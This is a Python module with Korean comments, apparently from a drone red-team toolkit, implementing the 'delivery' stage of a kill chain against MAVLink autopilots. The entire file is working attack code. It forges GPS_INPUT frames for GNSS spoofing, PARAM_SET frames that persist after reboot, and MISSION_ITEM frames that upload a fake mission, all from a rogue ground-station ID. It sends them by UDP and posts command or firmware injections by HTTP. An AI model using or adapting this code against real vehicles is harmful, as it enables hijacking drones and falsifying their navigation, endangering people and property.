"""전달(Delivery) — 실제 UDP/HTTP 전송. 킬체인 3단계 실전송.

  - udp_deliver: mavlink-router 로 UDP 데이터그램 송신(GNSS 스푸핑 프레임 등).
  - http_deliver: FastAPI 스텁으로 HTTP POST(펌웨어/명령 주입 등).
  - build_mavlink_gps_frame: pymavlink 있으면 실 GPS_INPUT, 없으면 태그된 자리표시.

순수 stdlib(+선택 pymavlink) — loopback 실검증. 실 표적은 env 로 명시(시험창 한정).
"""
from __future__ import annotations

import json
import socket
import urllib.request


def build_mavlink_gps_frame(lat_e7=367100000, lon_e7=1261300000, alt_m=80.0):
    """GNSS 스푸핑용 GPS_INPUT 프레임 바이트. pymavlink 있으면 실 프레임."""
    try:
        from pymavlink import mavutil
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 245                       # rogue GCS sysid
        msg = mav.gps_input_encode(
            0, 0, 0, 0, 0, 3, lat_e7, lon_e7, alt_m,
            0.3, 0.3, 0.0, 0.0, 0.0, 0.5, 0.5, 0.5, 8)
        return msg.pack(mav)
    except Exception:
        # pymavlink 부재/오류 — 전송 경로 검증용 태그 프레임(실 SITL 에선 pymavlink 필요).
        return b"MAVLINK_GPS_INPUT:" + json.dumps(
            {"lat_e7": lat_e7, "lon_e7": lon_e7, "alt_m": alt_m}).encode()


def build_mavlink_param_set_frame(param_id: str, value: float):
    """지속성용 PARAM_SET 프레임(EEPROM 잔존 = 재부팅 후에도 유지). 킬체인 5단계."""
    try:
        from pymavlink import mavutil
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 245
        msg = mav.param_set_encode(1, 1, param_id.encode()[:16].ljust(16, b"\0"),
                                   float(value), mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        return msg.pack(mav)
    except Exception:
        return b"MAVLINK_PARAM_SET:" + json.dumps({"id": param_id, "value": value}).encode()


def build_mavlink_mission_item_frame(seq: int, lat_e7: int, lon_e7: int, alt_m: float):
    """전달용 MISSION_ITEM 프레임(위조 임무 업로드). 킬체인 3단계."""
    try:
        from pymavlink import mavutil
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 245
        msg = mav.mission_item_int_encode(
            1, 1, seq, 0, 16, 0, 1, 0, 0, 0, 0, lat_e7, lon_e7, alt_m)
        return msg.pack(mav)
    except Exception:
        return b"MAVLINK_MISSION_ITEM:" + json.dumps(
            {"seq": seq, "lat_e7": lat_e7, "lon_e7": lon_e7}).encode()


def udp_deliver(host, port, payload: bytes) -> int:
    """UDP 데이터그램 송신. 반환: 송신 바이트 수."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        return s.sendto(payload, (host, int(port)))
    finally:
        s.close()


def http_deliver(url: str, payload: dict, timeout: float = 3.0) -> int:
    """FastAPI 스텁으로 JSON POST. 반환: HTTP 상태코드."""
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data,
                                 headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status
